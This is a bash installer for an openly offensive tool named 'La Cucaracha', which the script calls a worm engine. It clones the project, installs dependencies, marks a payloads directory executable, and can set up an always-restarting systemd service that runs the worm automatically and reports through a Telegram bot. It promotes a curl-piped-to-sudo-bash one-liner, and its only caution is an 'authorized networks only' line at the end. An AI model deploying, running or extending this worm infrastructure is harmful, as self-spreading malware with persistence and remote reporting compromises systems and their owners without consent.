#!/usr/bin/env bash
# =============================================================================
# LA CUCARACHA — INSTALLER
# =============================================================================
# One-liner:
#   curl -sSL https://raw.githubusercontent.com/masterfrequency/LaCucaracha/main/install.sh | sudo bash
#
# Installs: python3 venv + all deps, config template, executable scripts.
# Does NOT auto-start the worm — you configure first (see README).
# =============================================================================
set -euo pipefail

INSTALL_DIR="${INSTALL_DIR:-/opt/la-cucaracha}"
PYTHON_BIN="${PYTHON_BIN:-python3}"

echo "⚡️👾 La Cucaracha installer"
echo "  Target: $INSTALL_DIR"

# --- root check ---
if [[ $EUID -ne 0 ]]; then
    echo "✗ Run as root (sudo)." >&2
    exit 1
fi

# --- obtain source ---
mkdir -p "$INSTALL_DIR"
if [[ -d "./.git" ]]; then
    # running from a clone — copy it
    cp -a . "$INSTALL_DIR"/
elif command -v git >/dev/null 2>&1; then
    # piped via curl — clone the repo
    echo "  Cloning LaCucaracha into $INSTALL_DIR ..."
    git clone --depth 1 https://github.com/masterfrequency/LaCucaracha.git "$INSTALL_DIR"
else
    echo "✗ git not found and no clone present." >&2
    exit 1
fi
cd "$INSTALL_DIR"

# --- python + venv ---
if ! command -v "$PYTHON_BIN" >/dev/null 2>&1; then
    echo "✗ $PYTHON_BIN not found. Install python3 first." >&2
    exit 1
fi

"$PYTHON_BIN" -m venv .venv
# shellcheck disable=SC1091
source .venv/bin/activate
pip install --upgrade pip >/dev/null
pip install -r requirements.txt

# --- config template (never overwrite existing) ---
if [[ ! -f telegram_config.json ]]; then
    cp telegram_config.example.json telegram_config.json
    echo "  ✓ Created telegram_config.json — EDIT IT with your bot token + chat id."
fi

# --- make scripts executable ---
chmod +x scripts/*.sh LaCucaracha.py la_cucaracha_*.py payloads/*.sh 2>/dev/null || true

# --- systemd unit (optional) ---
if [[ "${WITH_SYSTEMD:-0}" == "1" ]]; then
    cat > /etc/systemd/system/la-cucaracha.service <<'UNIT'
[Unit]
Description=La Cucaracha worm engine
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
WorkingDirectory=/opt/la-cucaracha
ExecStart=/opt/la-cucaracha/.venv/bin/python3 -u /opt/la-cucaracha/LaCucaracha.py --auto --telegram
Restart=always
RestartSec=15

[Install]
WantedBy=multi-user.target
UNIT
    systemctl daemon-reload
    echo "  ✓ systemd unit installed (systemctl enable --now la-cucaracha to start)."
fi

echo ""
echo "✅ Installed to $INSTALL_DIR"
echo ""
echo "NEXT STEPS:"
echo "  1. nano $INSTALL_DIR/telegram_config.json   # bot token + chat id"
echo "  2. $INSTALL_DIR/.venv/bin/python3 -u $INSTALL_DIR/LaCucaracha.py --auto --telegram"
echo "  3. Or use the wrapper: $INSTALL_DIR/scripts/la-cucaracha-start.sh"
echo ""
echo "⚠  LEGAL: authorized networks only. You are responsible for usage."
